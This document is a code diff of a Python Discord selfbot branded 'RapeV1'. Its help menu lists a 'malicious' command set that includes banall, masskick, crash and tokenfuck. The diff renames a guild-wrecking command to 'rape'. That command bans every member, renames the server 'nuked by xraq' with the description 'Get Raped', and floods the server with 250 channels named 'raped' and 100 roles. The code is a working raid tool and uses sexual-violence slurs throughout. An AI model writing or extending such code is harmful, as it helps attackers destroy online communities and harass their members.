@@ -166,12 +166,12 @@ async def help(ctx, help):
         embed.set_thumbnail(url="https://i.imgur.com/t6NHYp5.jpeg")
         embed.set_footer(text=" RapeV1")
         embed.add_field(name="messages", value= "purge, deleteall, av, purgehac, spam, snipe", inline=False)
-        embed.add_field(name="malicious", value="webhookinfo, delhook, sendhook, purgehack, nuke, masschannel, massrole, tokenfuck, crash, masskick, banall", inline=False)
+        embed.add_field(name="malicious", value="webhookinfo, delhook, sendhook, purgehack, rape, masschannel, massrole, tokenfuck, crash, masskick, banall", inline=False)
         embed.add_field(name="networking", value="iplookup, ping", inline=False)
         embed.add_field(name="Fun", value="kiss, hug, dafloppa, btc, mommy, leet, dankmemerfarm", inline=False)
         embed.add_field(name="NSFW", value="hentai, lesbian", inline=False)
         embed.add_field(name="selfbot", value="clear, restart, logout", inline=False)
-        embed.add_field(name="Moderation", value="ban, kick, unban", inline=False)
+        embed.add_field(name="Moderation", value="ban, kick, unban, nuke", inline=False)
         embed.add_field(name="Info", value="shows info on the selfbot", inline=False)
         await ctx.send(embed=embed)
     except:
@@ -186,12 +186,13 @@ async def help(ctx, help):
         - dafloppa
         - btc
         - mommy
+        - leet
+        -dankmemerfarm (still in progress)
         Moderation:
-        - purge
-        - shutdown
         - ban
         - kick
         - unban
+        - nuke
         selfbot:
         - clear
         - restart
@@ -515,8 +516,10 @@ async def spam(ctx, amount: int, *, message):
     await ctx.message.delete()
     for _i in range(amount):
         await ctx.send(f'{message}\n' * 15)
+
+
 @bot.command()
-async def nuke(ctx):
+async def rape(ctx):
     for user in ctx.guild.members:
         try:
             await user.ban()
@@ -534,7 +537,7 @@ async def nuke(ctx):
             pass
     try:
         await ctx.guild.edit(
-            name="https://github.com/moronnnn",
+            name="nuked by xraq",
             description="Get Raped",
             reason="cus i can",
             icon=None,
@@ -548,12 +551,30 @@ async def masschannel(ctx):
     await ctx.message.delete()
     for _i in range(250):
         await ctx.guild.create_text_channel(name="raped")
+
+
 @bot.command()
 async def massrole(ctx):
     await ctx.message.delete()
     for _i in range(100):
         await ctx.guild.create_role(name="nuked by xraq")
 
+@bot.command()
+async def nuke(ctx, channel: discord.TextChannel = None):
+    if channel == None: 
+        await ctx.send("You did not mention a channel!")
+        return
+
+    nuke_channel = discord.utils.get(ctx.guild.channels, name=channel.name)
+
+    if nuke_channel is not None:
+        new_channel = await nuke_channel.clone(reason="Has been Nuked!")
+        await nuke_channel.delete()
+        await new_channel.send("channel was nuked successfully! :bomb: ")
+        await ctx.send("Nuked the Channel successfully!")
+
+    else:
+        await ctx.send(f"No channel named {channel.name} was found!")
 
 @bot.command()
 async def restart(ctx):
@@ -623,7 +644,7 @@ async def userinfo(ctx, member: discord.Member = None):
 
     embed.add_field(name="Roles", value="".join([role.mention for role in roles]))
     embed.add_field(name="Highest Role", value=member.top_role.mention)
-    await ctx.send(embed=embed, delete_after=20)
+    await ctx.send(embed=embed)
 
 @bot.command()
 async def createdm(ctx, member: discord.Member=None):
